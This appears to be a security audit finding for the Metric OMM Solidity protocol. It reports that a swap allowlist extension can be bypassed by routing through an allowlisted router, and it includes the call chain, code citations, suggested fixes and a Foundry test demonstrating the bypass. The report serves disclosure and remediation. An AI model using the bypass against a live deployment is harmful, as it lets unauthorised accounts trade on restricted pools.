The call path is fully traceable. Let me confirm the exact binding at each step.

The call path is fully confirmed. Here is the determination:

---

### Title
SwapAllowlistExtension Bypassed via Allowlisted Router — Any EOA Swaps Through Allowlisted Router Unblocked - (`metric-periphery/contracts/extensions/SwapAllowlistExtension.sol`)

### Summary

`SwapAllowlistExtension.beforeSwap` checks the `sender` argument, which is bound to `msg.sender` of `MetricOmmPool.swap`. When a swap is routed through `MetricOmmSimpleRouter`, `msg.sender` at the pool is the **router**, not the originating EOA. If the pool admin has allowlisted the router (`allowedSwapper[pool][router] = true`), every un-allowlisted EOA can bypass the per-user gate by routing through that router.

### Finding Description

The full call chain is:

```
attacker (EOA)
  → MetricOmmSimpleRouter.exactInputSingle(pool=target)
      → pool.swap(recipient, ...)          // msg.sender = router
          → _beforeSwap(msg.sender=router, ...)
              → SwapAllowlistExtension.beforeSwap(sender=router, ...)
                  checks: allowedSwapper[pool][router] == true  ✓  → PASSES
```

**Step 1 — Pool binds `msg.sender` as `sender`:**

`MetricOmmPool.swap` passes `msg.sender` (the router) as the `sender` argument to `_beforeSwap`. [1](#0-0) 

**Step 2 — `ExtensionCalling` forwards `sender` verbatim:**

`_beforeSwap` encodes `sender` (still the router address) into the ABI call dispatched to every configured extension. [2](#0-1) 

**Step 3 — Extension checks only the immediate caller, not the originating EOA:**

`beforeSwap` evaluates `allowedSwapper[msg.sender][sender]` where `msg.sender` is the pool and `sender` is the router. The attacker's address is never consulted. [3](#0-2) 

**Step 4 — Router never forwards the originating EOA:**

`exactInputSingle` calls `pool.swap(...)` directly; the original `msg.sender` (the attacker) is stored only in the callback context for payment purposes and is never passed to the pool as the swap initiator. [4](#0-3) 

### Impact Explanation

Any EOA that is **not** individually allowlisted can execute swaps on a restricted pool simply by calling through an allowlisted router. The pool's token balances are directly affected: the swap settles and transfers tokens exactly as a legitimate allowlisted swap would. The invariant "only individually allowlisted addresses may swap" is broken for every pool that has allowlisted a public router.

### Likelihood Explanation

`MetricOmmSimpleRouter` is the canonical public swap interface for the protocol. A pool admin who wants to restrict direct pool access while still permitting router-mediated swaps will naturally allowlist the router. This is the expected operational pattern, making the precondition (`allowedSwapper[pool][router] = true`) a routine, non-adversarial configuration. Once that configuration exists, any EOA can exploit it with a single `exactInputSingle` call — no special privileges, no flash loans, no oracle manipulation required.

### Recommendation

Pass the **originating EOA** through the call chain so the extension can gate on it. Two concrete options:

1. **Add an `origin` parameter** to `_beforeSwap` / `beforeSwap` (e.g., `tx.origin` or an explicit caller-supplied address validated by the router) and check `allowedSwapper[pool][origin]` instead of `allowedSwapper[pool][sender]`.
2. **Check both**: require `allowedSwapper[pool][sender] || allowedSwapper[pool][tx.origin]` so direct swaps and router swaps are each gated on the economically relevant actor.

Option 1 with an explicit forwarded address (rather than raw `tx.origin`) is preferable for composability and account-abstraction compatibility.

### Proof of Concept

```solidity
// Foundry integration test sketch
function test_swapAllowlistBypassViaRouter() public {
    // Setup: pool with SwapAllowlistExtension in BEFORE_SWAP_ORDER
    // Admin allowlists the router, NOT the attacker
    swapExtension.setAllowedToSwap(address(pool), address(router), true);
    // allowedSwapper[pool][attacker] == false  (never set)

    // Attacker routes through the allowlisted router
    vm.startPrank(attacker);
    token0.approve(address(router), type(uint256).max);
    uint256 amountOut = router.exactInputSingle(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool:             address(pool),
            tokenIn:          address(token0),
            tokenOut:         address(token1),
            zeroForOne:       true,
            amountIn:         1_000e18,
            amountOutMinimum: 0,
            recipient:        attacker,
            deadline:         block.timestamp + 1,
            priceLimitX64:    0,
            extensionData:    ""
        })
    );
    vm.stopPrank();

    // Extension passed; attacker received tokens despite not being allowlisted
    assertGt(amountOut, 0, "bypass succeeded: un-allowlisted EOA swapped");
    assertFalse(
        swapExtension.isAllowedToSwap(address(pool), attacker),
        "attacker was never individually allowlisted"
    );
}
```

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L230-231)
```text
    _beforeSwap(
      msg.sender,
```

**File:** metric-core/contracts/ExtensionCalling.sol (L160-176)
```text
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L37-39)
```text
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-80)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
```
